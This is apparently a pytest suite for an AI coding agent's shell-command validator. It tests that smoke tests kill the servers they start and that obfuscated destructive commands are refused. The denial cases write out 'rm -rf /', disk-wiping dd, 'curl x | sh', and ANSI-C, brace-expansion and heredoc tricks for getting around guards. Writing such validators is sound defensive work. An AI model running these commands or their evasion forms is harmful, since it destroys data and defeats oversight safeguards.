"""§4UY review r1 — C7 (a smoke test ends what it started, after starting it) and C8 (ANSI-C quoting, brace
expansion, a script written and run in the same command). Reviewer repro: `_rev/val_cmp.py`."""
import pytest

from ghost_agent.tools.execute import _bg_detached, _daemonized_server_block, _ends_its_background
from ghost_agent.tools.validators import _ansi_c_unquote, _brace_words, validate_shell


# ── C7 ────────────────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd,ends", [
    ("python3 -m http.server 8000 & sleep 1; curl x; kill %1", True),
    ("python3 app.py & PID=$!; sleep 1; curl x; kill $PID", True),
    ("python3 app.py & PID=$!; sleep 1; curl x; kill -9 \"${PID}\"", True),
    ("python3 app.py & sleep 1; kill -9 $!", True),
    ("python3 app.py & sleep 1; kill %%", True),
    ("python3 a.py & node b.js & sleep 1; kill %1 %2", True),
    ("python3 a.py & node b.js & sleep 1; kill $(jobs -p)", True),
    ("python3 a.py & P=$!; node b.js & Q=$!; sleep 1; kill $P $Q", True),
    ("trap 'kill $!' EXIT; python3 app.py & sleep 1; curl x", True),
    ("python3 app.py & sleep 1; pkill -f app.py", True),
    ("python3 app.py & sleep 1; pkill -f 'python3 app.py'", True),
    ("timeout 15 python3 app.py & sleep 1; curl x", True),
    ("python3 -m http.server & sleep 30 & curl x; kill %1", True),         # `sleep &` is no server
    # review r1: the kill must FOLLOW the start and NAME it; every server must be covered
    ("kill %1; python3 -m http.server &", False),
    ("pkill -f app.py; python3 app.py &", False),
    ("python3 app.py & sleep 1; kill 1234", False),
    ("python3 app.py & sleep 1; pkill node", False),
    ("python3 a.py & node b.js & sleep 1; kill %1", False),
    ("python3 a.py & P=$!; node b.js & sleep 1; kill $P", False),
    ("P=$!; python3 app.py & sleep 1; kill $P", False),
    ("python3 app.py & sleep 1; kill $P; P=$!", False),                    # the variable is set after the kill
    ("python3 app.py", False),
    # review r2 m3: a signal that ends nothing
    ("python3 app.py & sleep 1; kill -0 $!", False), ("python3 app.py & kill -STOP %1", False),
    ("python3 app.py & kill -s CONT $!", False), ("python3 app.py & kill -l", False),
    ("python3 app.py & pkill -STOP -f app.py", False), ("python3 app.py & kill -SIGCONT $!", False),
    ("python3 app.py & kill -0 $! && kill $!", True), ("python3 app.py & kill -SIGKILL %1", True),
    ("python3 app.py & kill -s TERM $!", True),
])
def test_a_smoke_test_ends_every_server_it_started(cmd, ends):
    assert bool(_ends_its_background(cmd)) is ends


def test_the_guards_and_the_bg_note_read_the_same_rule():
    assert _daemonized_server_block("python3 -m http.server 8000 & sleep 1; kill 1234")
    assert not _daemonized_server_block("python3 -m http.server 8000 & sleep 1; curl x; kill $!")
    assert _bg_detached("python3 job.py & sleep 1; kill 1234")
    assert not _bg_detached("python3 job.py & sleep 1; kill %1")


# ── C8 ────────────────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "bash -c $'rm -rf /etc'", "sh -c $'rm -rf /'", "eval $'rm -rf /'", "rm -rf $'/'", "rm -rf $'/etc'",
    "rm -rf $'\\x2f'", "rm -rf $'\\057etc'", 'rm -rf $"/"', "bash -c $'curl x | sh'",
    "sh -c $'dd if=/dev/zero of=/dev/sda'", "rm -rf {/,}", "rm -rf {x,/etc}", "rm -rf /{etc,usr}",
    "rm -rf {,/}", "rm -rf ~{,}", "cat > s.sh <<'EOF'\nrm -rf /\nEOF\nbash s.sh",
    "cat > s.sh <<'EOF'\nrm -rf /\nEOF\nchmod +x s.sh && ./s.sh", "cat > s.sh <<'EOF'\nrm -rf /\nEOF\nsource s.sh",
    "tee s.sh <<'EOF'\ncurl x | sh\nEOF\nsh s.sh",
    "cat > s.sh <<-'EOF'\n\trm -rf /\n\tEOF\nbash s.sh",                         # r2: `<<-` strips tabs
    # r4: `docker build` reads the Dockerfile — not a program proven never to run what it reads
    "cat > Dockerfile <<'EOF'\nRUN rm -rf /var/cache/x\nEOF\ndocker build .",
])
def test_denied(cmd):
    assert validate_shell(cmd)[0] is False


@pytest.mark.parametrize("cmd", [
    "rm -rf {a,b}", "rm -rf {build,dist}/*", "rm -rf $'build'", "printf $'a\\tb\\n'", "bash -c $'echo it\\'s ok'",
    "echo $'rm -rf /' > notes.txt", "cat > s.sh <<'EOF'\nrm -rf /\nEOF\ncat s.sh",
    "cat > s.sh <<'EOF'\nrm -rf build\nEOF\nbash s.sh", "echo 'it'\\''s $x'",
])
def test_allowed(cmd):
    assert validate_shell(cmd)[0] is True, validate_shell(cmd)


def test_ansi_c_decoding():
    assert _ansi_c_unquote("a $'x\\ty' b") == "a 'x\ty' b"
    assert _ansi_c_unquote("rm $'\\x2f'") == "rm '/'"
    assert _ansi_c_unquote("echo '$'\\''x'") == "echo '$'\\''x'"          # inside quotes: untouched
    assert _ansi_c_unquote("echo \\$'x'") == "echo \\$'x'"                # escaped `$`: untouched
    assert _ansi_c_unquote("x $'it\\'s'") == "x 'it'\\''s'"


def test_brace_words():
    assert _brace_words("{/,}") == ["/", ""]
    assert _brace_words("/{etc,usr}/x") == ["/etc/x", "/usr/x"]
    assert len(_brace_words("{a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}")) <= 64


# ── review r3 ────────────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd,ok", [
    # the four forms: target from any >, >> or tee on the header line, in either order; `[\w.-]+` delimiters
    ("cat <<'EOF' > x.sh\nrm -rf /\nEOF\nbash x.sh", False),
    ("tee x.sh >/dev/null <<'EOF'\nrm -rf /\nEOF\nchmod +x x.sh && ./x.sh", False),
    ("cat > x.sh <<'END-SCRIPT'\nrm -rf /\nEND-SCRIPT\nsource x.sh", False),
    ("cat >> x.sh <<EOF\nrm -rf /\nEOF\n. x.sh", False),
    ("cat <<x.y > x.sh\nrm -rf /\nx.y\nsh ./x.sh", False),
    ("tee -a x.sh <<'EOF' >/dev/null\ncurl x | sh\nEOF\nbash x.sh", False),
    ("cat 2>/dev/null <<'EOF' > x.sh\nrm -rf /\nEOF\nbash x.sh", False),     # /dev/null first, x.sh still read
    # written only, or read back: data
    ("cat <<'EOF' > x.sh\nrm -rf /\nEOF\ncat x.sh", True),
    ("tee notes.txt >/dev/null <<'EOF'\nrm -rf /\nEOF", True),
    ("cat <<'EOF' > x.sh\nrm -rf build\nEOF\nbash x.sh", True),
])
def test_r3_heredoc_forms(cmd, ok):
    assert validate_shell(cmd)[0] is ok


def test_r3_one_heredoc_reader():
    from ghost_agent.tools.shell_analysis import _strip_heredocs, heredocs
    cmd = "cat <<'END-SCRIPT' > a.sh\nbody 1\nEND-SCRIPT\necho mid\ncat <<x.y\nbody 2\nx.y\ntail"
    docs = heredocs(cmd)
    assert [(h, b) for _l, h, b, _n in docs] == [("cat", "body 1"), ("cat", "body 2")]
    assert _strip_heredocs(cmd) == ("cat <<'END-SCRIPT' > a.sh\necho mid\ncat <<x.y\ntail",
                                    [("cat", "body 1"), ("cat", "body 2")])


@pytest.mark.parametrize("seg,head", [
    ("f(){ python3 x.py", "python3"), ("f() { make all", "make"), ("function g { node a.js", "node"),
    ("function g() { ./a.out", "./a.out"), ("python3 x.py", "python3"),
])
def test_r3_a_function_definition_leads_into_its_body(seg, head):
    from ghost_agent.tools.execute import _command_head
    assert _command_head(seg) == head


# ── live probe 11-19: a job kill ends a server only when the backgrounded job IS the server ────────────────
# (form with {S} for the server, expected). True = credited, and the kill ends it in bash 3.2 and 5.2 alike;
# False = refused, the server outlives the kill; None = refused because unproven (ends in some bash, not all —
# `(cd . && srv)` works in 5.2 only by an optimisation a redirect silently removes — or a refused shape).
JOB_FORMS = [
    ("{S} & P=$!; sleep 0.3; kill $P", True),
    ("cd . ; {S} & P=$!; sleep 0.3; kill $P", True),
    ("(cd . && exec {S}) & P=$!; sleep 0.3; kill $P", True),
    ("{ cd .; exec {S}; } & sleep 0.3; kill $!", True),
    ("cd . && exec {S} & sleep 0.3; kill $!", True),
    ("nohup {S} & P=$!; sleep 0.3; kill $P", True),
    ("({S}) & P=$!; sleep 0.3; kill $P", True),
    ("({S} > log 2>&1) & P=$!; sleep 0.3; kill $P", True),
    ("(cd . && {S}) & P=$!; sleep 0.3; kill $P", None),       # dead in 5.2 only by an optimisation
    ("cd . && {S} & P=$!; sleep 0.3; kill $P", False),   # the live probe: `$!` is the list's subshell
    ("cd . &&\n{S} & P=$!; sleep 0.3; kill $P", False),   # the same list over two lines
    ("cd . && \\\n{S} & P=$!; sleep 0.3; kill $P", False), # … and with a continuation
    ("{ cd .; {S}; } & sleep 0.3; kill $!", False),
    ("{S} | cat & sleep 0.3; kill %1", True),            # a job spec signals every process of a pipeline
    ("{S} | cat & sleep 0.3; kill $!", False),           # `$!` is only its last process
    ("({S} | cat) & sleep 0.3; kill %1", False),
    ("cd . && {S} & sleep 0.3; kill %1", False),
    ("cd . && {S} & sleep 0.3; kill $(jobs -p)", False),
    ("cd . && {S} & P=$!; sleep 0.3; pkill -P $P; kill $P", None),  # ends it, but not a proven form
    ("{S} & P=$!; sleep 0.3; pkill -P $P", False),       # only the children of the server
    ("({S}; true) & P=$!; sleep 0.3; kill $P", False),   # the server is not the subshell's last command
    ("(cd . && {S} || echo failed) & P=$!; sleep 0.3; kill $P", False),
    ("(cd .; {S}; echo done) & P=$!; sleep 0.3; kill $P", False),
    ("(cd . && {S}) > log 2>&1 & P=$!; sleep 0.3; kill $P", None),
    ("({S} &); sleep 0.3; kill $!", False),              # started by the subshell, not by this shell
    ("f() { {S}; }; f & P=$!; sleep 0.3; kill $P", False),
    ("eval 'cd . && {S}' & P=$!; sleep 0.3; kill $P", False),
    ("bash -c 'cd . && {S}' & P=$!; sleep 0.3; kill $P", False),
    ("cd . && {S} & sleep 0.3; pkill -f '{N}'", True),   # by name: what runs, wherever it was started
    ("while true; do {S}; done & P=$!; sleep 0.3; kill $P", False),
    ("if true; then {S}; fi & sleep 0.3; kill $!", False),
    # the coordinator's sandbox 5.2 measurements 11-19: a redirect on the last command loses bash's own exec
    ("(cd . && {S} > log 2>&1) & P=$!; sleep 0.3; kill $P", False),
    ("(cd .; {S} > /dev/null 2>&1) & P=$!; sleep 0.3; kill $P", False),
    ("(cd . && {S} 2>&1) & P=$!; sleep 0.3; kill $P", False),
    ("(cd . && X=1 {S}) & P=$!; sleep 0.3; kill $P", None),
    ("(cd . && nohup {S}) & P=$!; sleep 0.3; kill $P", None),
    ("({S} > log) & P=$!; sleep 0.3; kill $P", True),
    ("(cd . && exec {S} > log 2>&1) & P=$!; sleep 0.3; kill $P", True),
    ("cd . && exec {S} > log 2>&1 & P=$!; sleep 0.3; kill $P", True),
    ("{ cd .; exec {S} > log 2>&1; } & P=$!; sleep 0.3; kill $P", True),
    ("bash -c '{S}' & P=$!; sleep 0.3; kill $P", None),
    ("({S}) > log 2>&1 & P=$!; sleep 0.3; kill $P", True),     # redirects after a group
    ("(cd . && exec {S}) > log 2>&1 & P=$!; sleep 0.3; kill $P", True),
    ("({S}; exec {S}) & P=$!; sleep 0.3; kill $P", False),     # another server before the exec'd one
    # round 3 (rev6r3/b4.py): one head resolver — a nested shell behind any wrapper / path / quote is no program
    ("/bin/bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("env X=1 bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("env -i bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("nice -n 5 bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("nohup -- bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("exec bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("\\bash -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("'bash' -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("B=bash; $B -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("(cd . && exec env X=1 bash -c '{S}; true') & P=$!; sleep 0.3; kill $P", False),
    ("cd . && exec env X=1 sh -c '{S}; true' & P=$!; sleep 0.3; kill $P", False),
    ("(cd . && exec env X=1 {S}) & P=$!; sleep 0.3; kill $P", True),
    ("cd . && exec nohup {S} & P=$!; sleep 0.3; kill $P", True),
    ("nice -n 10 {S} & P=$!; sleep 0.3; kill $P", True),
    ("env -u FOO {S} & P=$!; sleep 0.3; kill $P", True),
    # B3-M2: a job spec ends a pipeline only when the server is its first stage
    ("sleep 50 | {S} & sleep 0.3; kill %1", None),
    ("echo hi | {S} & sleep 0.3; kill $(jobs -p)", None),
    ("{S} | cat | cat & sleep 0.3; kill %1", True),
    # a job started inside `( … )` is not this shell's job
    ("({S} &); sleep 20 & sleep 0.3; kill %1", False),
    ("({S} &); sleep 20 & sleep 0.3; kill $(jobs -p)", False),
    # a shell running a SCRIPT (no -c payload): `$!` is the shell, its server child outlives the kill
    ("printf '{S}\\n' > s.sh; bash s.sh --port 1 & P=$!; sleep 0.3; kill $P", False),
    ("printf '{S}\\n' > s.sh; nice env sh s.sh --port 1 & P=$!; sleep 0.3; kill $P", False),
    ("for i in 1 2; do {S} & done; sleep 0.3; kill $(jobs -p)", None),
]


@pytest.mark.parametrize("form,ends", JOB_FORMS)
def test_live_job_forms_in_real_bash(form, ends, tmp_path):
    import subprocess, uuid
    if ends is None:
        pytest.skip("unproven form: refused whatever this host's bash does")
    tag = str(30000 + uuid.uuid4().int % 9000)
    srv = f"sleep {tag}"
    script = form.replace("{S}", srv).replace("{N}", srv) + "; sleep 0.3"
    # no pipes: a server left running would hold them open and the run would wait for it
    subprocess.run(["/bin/bash", "-c", script], cwd=str(tmp_path), stdin=subprocess.DEVNULL,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
    left = subprocess.run(["pgrep", "-f", srv], capture_output=True).returncode == 0
    subprocess.run(["pkill", "-f", srv], capture_output=True)
    assert left is (not ends), script


@pytest.mark.parametrize("form,ends", JOB_FORMS)
def test_live_job_forms_are_read_the_same_by_the_guard(form, ends):
    from ghost_agent.tools.execute import _ends_its_background
    srv = "python3 -m http.server 8123"
    # refuse when unsure (operator 11-19): a form that ends the server but is not PROVEN (None) is not credited
    assert _ends_its_background(form.replace("{S}", srv).replace("{N}", srv)) is bool(ends), form


# the reviewer's harness (rev6r/b2.py): commands a model writes, and whether a guard lets them run — measured
# against bash (ALIVE → must be refused); rows the harness could not run carry the reading of their twin
B2 = [
    ("cd d &&\npython3 -m http.server 8123 & P=$!; sleep 1; curl -s localhost:8123; kill $P", False),
    ("cd d && \\\npython3 -m http.server 8123 & P=$!; sleep 1; curl -s localhost:8123; kill $P", False),
    ("cd d && python3 -m http.server 8123 \\\n --bind 127.0.0.1 & P=$!; sleep 1; kill $P", False),
    # KNOWN GAP (operator 11-19: no keyword list): a server written as quoted inline code is data to the guard
    pytest.param('cd d && python3 -c "import http.server as s; s.test(s.SimpleHTTPRequestHandler, port=8123)" & '
                 "P=$!; sleep 1; kill $P", False, marks=pytest.mark.xfail(strict=True, reason="inline server unseen")),
    pytest.param("cd d && node -e \"const h=require('http'); h.createServer((q,r)=>r.end('ok')).listen(8123)\" & "
                 "P=$!; sleep 1; kill $P", False, marks=pytest.mark.xfail(strict=True, reason="inline server unseen")),
    ("cd d && python3 -m http.server 8123 --bind '(' & P=$!; sleep 1; kill $P", False),
    ("cd d && python3 -m http.server 8123 > log 2>&1 & P=$!; sleep 1; kill $P", False),
    ("node -e \"require('http').createServer((q,r)=>{ r.end(q.url || '/') }).listen(8123)\" & P=$!; sleep 1; "
     "curl -s localhost:8123; kill $P", True),
    ('python3 -c "import http.server as s, re; x = 1 | 2; s.test(s.SimpleHTTPRequestHandler, port=8123)" & '
     "P=$!; sleep 1; kill $P", True),
    ("python3 app.py --serve --routes 'a|b' --port 8123 & P=$!; sleep 1; curl -s localhost:8123; kill $P", True),
    ("python3 -m http.server 8123 & P=$!; sleep 1; curl -s localhost:8123 | grep -q ok && echo PASS || "
     "echo FAIL; kill $P", True),
    ("FLASK_APP=app.py flask run --port 8123 & P=$!; sleep 2; curl -s localhost:8123; kill $P", True),
    ("python3 -m http.server 8123 &\nSERVER=$!\nsleep 1\ncurl -s http://localhost:8123/ | head -3\n"
     "kill $SERVER 2>/dev/null\necho done", True),
    ("npm start & sleep 2; curl -s localhost:3000; kill %1", True),
    ("case $1 in *) python3 -m http.server 8123 & P=$!;; esac; sleep 1; kill $P", True),
    ("cd d || exit 1; python3 -m http.server 8123 & P=$!; sleep 1; kill $P", True),
    ("test -f app.py && python3 -m http.server 8123 & sleep 1; kill $!", False),
    ("python3 -m http.server 8123 & P=$!; cd d && python3 -m http.server 8124 & Q=$!; sleep 1; kill $P $Q", False),
    ("python3 -m http.server 8123 & cd d && sleep 1; kill $!", True),
    ("python3 -m http.server 8123& P=$!; sleep 1; kill $P", True),
    ("python3 -m http.server 8123 # a note; (x\n& P=$!", False),             # a comment is no structure
    ("f(){ python3 -m http.server 8123; }; f & P=$!; sleep 1; kill $P", False),
]


S8 = "python3 -m http.server 8123"
#: ordinary smoke tests a model writes — every one must run (the reviewer's b3 "ordinary" section + the b2 rows)
SMOKE_OK = [f.replace("{S}", S8).replace("{S2}", "python3 -m http.server 8124") for f in [
    "{S} & sleep 1; curl -s localhost:8123; kill $!",
    "{S} &\nPID=$!\nsleep 1\ncurl -s localhost:8123\nkill $PID",
    "{S} > /dev/null 2>&1 &\nPID=$!\nsleep 1\ncurl -s localhost:8123\nkill $PID",
    "{S} &>/dev/null &\nPID=$!\nsleep 1\nkill $PID",
    "{S} >server.log 2>&1 & PID=$!; sleep 1; curl -s localhost:8123 | head -5; kill $PID; wait $PID 2>/dev/null",
    "{S} & sleep 1; curl -s localhost:8123; kill %1",
    "{S} & sleep 1; curl -s localhost:8123; kill $(jobs -p)",
    "{S} & sleep 1; curl -s localhost:8123 && echo ok || echo fail; kill $! 2>/dev/null || true",
    "{S} & PID=$!; trap 'kill $PID' EXIT; sleep 1; curl -s localhost:8123",
    "trap 'kill $(jobs -p)' EXIT; {S} & sleep 1; curl -s localhost:8123",
    "PORT=8123 {S} & PID=$!; sleep 1; kill $PID",
    "cd d\n{S} &\nPID=$!\nsleep 1\nkill $PID",
    "cd d; {S} & PID=$!; sleep 1; kill $PID",
    "cd d && ({S} & PID=$!; sleep 1; kill $PID)",
    "cd d && { {S} & PID=$!; sleep 1; kill $PID; }",
    "{S} 2>&1 | tee server.log & sleep 1; kill %1",
    "{S} |& tee server.log & sleep 1; kill %1",
    "({S}) & PID=$!; sleep 1; kill $PID",
    "(cd d && exec {S} > log 2>&1) & PID=$!; sleep 1; kill $PID",
    "({S} > log) & PID=$!; sleep 1; kill $PID",
    "(cd d && exec {S}) & PID=$!; sleep 1; kill $PID",
    "cd d && exec {S} & sleep 1; kill $!",
    "{ cd d; exec {S}; } & PID=$!; sleep 1; kill $PID",
    "{S} & PID=$!; sleep 1; if true; then echo ok; fi; kill $PID",
    "{S} & PID=$!; for i in 1 2 3; do true && break; sleep 1; done; kill $PID",
    "{S} & PID=$!; sleep 1; curl -s 'localhost:8123/?a=1&b=2'; kill $PID",
    "{S} & PID=$!; sleep 1; echo \"done; ok & fine\"; kill $PID",
    "echo 'a && b' ; {S} & PID=$!; sleep 1; kill $PID",
    "echo \"smile :)\"; {S} & PID=$!; sleep 1; kill $PID",
    "echo \"it's up\"; {S} & PID=$!; sleep 1; kill $PID",
    "# start; then stop\n{S} & PID=$!; sleep 1; kill $PID",
    "{S} & PID=$!  # background it\nsleep 1\nkill $PID  # stop",
    "{S} <<< 'in' & PID=$!; sleep 1; kill $PID",
    "[ -d d ] && cd d; {S} & PID=$!; sleep 1; kill $PID",
    "{S} & PID=$! && sleep 1 && true && kill $PID",
    "{S} & PID=$!; sleep 1; kill -TERM \"$PID\"",
    "{S} & PID=$!; sleep 1; kill ${PID}",
    "nohup {S} > log 2>&1 & PID=$!; sleep 1; kill $PID",
    "env X=1 {S} & PID=$!; sleep 1; kill $PID",
    "{S} & A=$!; {S2} & B=$!; sleep 1; kill $A $B",
    "{S} & {S2} & sleep 1; kill %1 %2",
    "{S} & {S2} & sleep 1; kill $(jobs -p)",
    "{S} & trap 'kill $!' EXIT; sleep 1",
    "cd d && {S} & sleep 1; pkill -f http.server",
    "timeout 15 {S} & sleep 1; curl -s localhost:8123",
    "cat > d/app.py <<'EOF'\n# it's a tiny app\nprint('hi')\nEOF\n{S} & P=$!; sleep 1; kill $P",
    "cat > d/notes.txt <<EOF\nDon't forget (the port\nEOF\n{S} & P=$!; sleep 1; kill $P",
    "python3 - <<'EOF'\nprint(\"it's ready\")\nEOF\n{S} & P=$!; sleep 1; kill $P",
    "git commit -m 'wip (server' 2>/dev/null; {S} & P=$!; sleep 1; kill $P",
    "case x in *) {S} & P=$!;; esac; sleep 1; kill $P",
    "x=$(echo 1); {S} & P=$!; sleep 1; kill $P",
    "{S} $((8000+123)) & P=$!; sleep 1; kill $P",
    "{S} --dir `pwd` & P=$!; sleep 1; kill $P",
    "{S} --dir $(dirname $(pwd)) & P=$!; sleep 1; kill $P",
    "{S} --dir \"$(pwd)/public\" & P=$!; sleep 1; kill $P",
    "{S} --port ${PORT:-8123} & P=$!; sleep 1; kill $P",
    "FOO=\"a b\" BAR=1 {S} & P=$!; sleep 1; kill $P",
    "{S} --name \"my app (dev)\" & P=$!; sleep 1; kill $P",
    "(cd d && exec {S} > log 2>&1) & sleep 1; kill %1",
    "{S} & P=$!; sleep 1; curl -s localhost:8123 || { echo fail; kill $P; exit 1; }; kill $P",
    "main() { {S} & P=$!; sleep 1; kill $P; }; main",
    "set -euo pipefail\n{S} &\nP=$!\nsleep 1\nkill $P",
    "{S} & P=$!; sleep 1; python3 - <<'EOF'\nimport urllib.request as u\nprint(\"it's\", u.__name__)\nEOF\nkill $P",
    "kill $(lsof -ti:8123) 2>/dev/null; {S} & P=$!; sleep 1; kill $P",
]] + [r[0] for r in B2 if not hasattr(r, "values") and r[1]]

#: leaks — the server outlives the command (measured), so each must be refused
SMOKE_LEAK = [f.replace("{S}", S8) for f in [
    "cd d && {S} & P=$!; sleep 1; kill $P",
    "cd d &&\n{S} & P=$!; sleep 1; kill $P",
    "cd d && \\\n{S} & P=$!; sleep 1; kill $P",
    "cd d \\\n&& {S} & P=$!; sleep 1; kill $P",
    "cd d && {S} '(' & P=$!; sleep 1; kill $P",
    "cd d && {S} \"a\nb\" & P=$!; sleep 1; kill $P",
    "echo it\\'s; cd d && {S} & P=$!; sleep 1; kill $P",
    "{ cd d; {S}; } & P=$!; sleep 1; kill $P",
    "({S}; true) & P=$!; sleep 1; kill $P",
    "(cd d && {S} || echo failed) & P=$!; sleep 1; kill $P",
    "(cd d; {S}; echo done) & P=$!; sleep 1; kill $P",
    "({S} && echo stopped) & P=$!; sleep 1; kill $P",
    "(cd d && {S} | tee log) & P=$!; sleep 1; kill $P",
    "(trap 'echo bye' EXIT; cd d && {S}) & P=$!; sleep 1; kill $P",
    "({S} &); sleep 1; kill $!",
    "(cd d && {S}) & PID=$!; sleep 1; kill $PID",
    "(cd d && {S}) > log 2>&1 & PID=$!; sleep 1; kill $PID",
    "(cd d && {S} > log 2>&1) & P=$!; sleep 1; kill $P",
    "(cd d; {S} > /dev/null 2>&1) & P=$!; sleep 1; kill $P",
    "(cd d && {S} 2>&1) & P=$!; sleep 1; kill $P",
    "({S} &) ; sleep 1; kill %1",
    "(cd d && (cd . && {S})) & P=$!; sleep 1; kill $P",
    "{S} & P=$!; sleep 1; pkill -P $P",
    "{S} & sleep 1; pkill -P $!",
    "while true; do {S}; done & P=$!; sleep 1; kill $P",
    "if true; then {S}; fi & P=$!; sleep 1; kill $P",
    "for i in 1 2; do {S}; done & P=$!; sleep 1; kill $P",
    "f() { {S}; }; f & P=$!; sleep 1; kill $P",
    "function serve { {S}; }; serve & P=$!; sleep 1; kill $P",
    "bash -c 'cd d && {S}' & P=$!; sleep 1; kill $P",
    "sh -c 'cd d && {S}' & P=$!; sleep 1; kill $P",
    "eval 'cd d && {S}' & P=$!; sleep 1; kill $P",
    "eval \"cd d && {S}\" & sleep 1; kill $!",
    "{S} | cat & sleep 1; kill $!",
    "case x in *) cd d && {S} & P=$!;; esac; sleep 1; kill $P",
    "/usr/bin/env bash -c '{S}; true' & P=$!; sleep 1; kill $P",
    "'bash' -c '{S}; true' & P=$!; sleep 1; kill $P",
    "\\bash -c '{S}; true' & P=$!; sleep 1; kill $P",
    "B=bash; $B -c '{S}; true' & P=$!; sleep 1; kill $P",
    "S=python3; $S -m http.server 8123 & P=$!; sleep 1; kill $P",
    # round 4 (rev6r3/lc.py): a combined flag ending in `c`; a payload behind any wrapper is never credited
    "bash -lc 'python3 -m http.server 8123 &'",
    "sh -ec 'python3 -m http.server 8123 &'",
    "bash -lc 'cd d && {S}' & P=$!; sleep 1; kill $P",
    "bash -ec 'cd d && {S}' & P=$!; sleep 1; kill $P",
    "stdbuf -oL bash -c '{S}; true' & P=$!; sleep 1; kill $P",
    "caffeinate -i bash -c '{S}; true' & P=$!; sleep 1; kill $P",
    "busybox sh -c '{S}; true' & P=$!; sleep 1; kill $P",
    "/usr/bin/time {S} & P=$!; sleep 1; kill $P",
    "echo hi | {S} & sleep 1; kill %1",
    "({S} &); sleep 20 & sleep 1; kill %1",
]] + [r[0] for r in B2 if not hasattr(r, "values") and not r[1]]


def _runs(cmd):
    from ghost_agent.tools.execute import _daemonized_server_block, _foreground_server_block
    return _daemonized_server_block(cmd) is None and _foreground_server_block(cmd) is None


@pytest.mark.parametrize("cmd", SMOKE_OK)
def test_ordinary_smoke_tests_run(cmd):
    assert _runs(cmd), cmd


@pytest.mark.parametrize("cmd", SMOKE_LEAK)
def test_leaking_smoke_tests_are_refused(cmd):
    assert not _runs(cmd), cmd


@pytest.mark.parametrize("cmd,runs", B2)
def test_review_harness_rows(cmd, runs):
    from ghost_agent.tools.execute import _daemonized_server_block, _foreground_server_block
    ok = _daemonized_server_block(cmd) is None and _foreground_server_block(cmd) is None
    assert ok is runs, cmd


def test_live_the_refusal_names_the_fix():
    from ghost_agent.tools.execute import _daemonized_server_block
    msg = _daemonized_server_block("cd ft && python3 -m http.server 8123 >/dev/null 2>&1 & SRV=$!; sleep 1; "
                                   "curl -s http://127.0.0.1:8123/; kill $SRV")
    assert msg and "(cd dir && server) &" in msg and "pkill -f" in msg and "cd dir; server &" in msg
    assert "timeout 15 <server>" in msg and "kill %1" in msg          # the smoke-test forms (mutant C7b)


@pytest.mark.parametrize("cmd", ["python3 -c 'print(1)' & wait", "gcc -c a.c & wait", "git -c a=b status",
                                 "psql -c 'select 1'", "python3 -c 'import os' && gcc -c x.c"])
def test_non_shell_dash_c_is_not_a_shell_payload(cmd):
    from ghost_agent.tools.execute import _SH_C_PAYLOAD_RE
    assert not _SH_C_PAYLOAD_RE.search(cmd) and _runs(cmd)


def test_head_resolver_is_linear():
    import time
    from ghost_agent.tools.execute import _ends_its_background
    cmd = "env " + "-u X " * 200000 + "python3 -m http.server 8123 & kill $!"
    t = time.monotonic()
    assert _ends_its_background(cmd) is True
    assert len(cmd) > 1_000_000 and time.monotonic() - t < 2.0
